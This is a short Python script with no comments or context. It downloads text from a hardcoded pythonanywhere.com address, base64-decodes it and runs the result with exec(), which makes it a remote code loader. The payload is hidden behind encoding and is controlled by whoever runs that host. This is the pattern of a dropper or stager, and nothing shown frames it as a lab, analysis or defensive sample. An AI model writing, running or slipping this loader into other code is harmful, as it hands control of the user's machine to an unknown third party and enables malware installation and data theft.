import requests
import base64

url = "https://farhad807156.pythonanywhere.com/core"

data = requests.get(url).text.strip()

code = base64.b64decode(data).decode("utf-8")

exec(code)
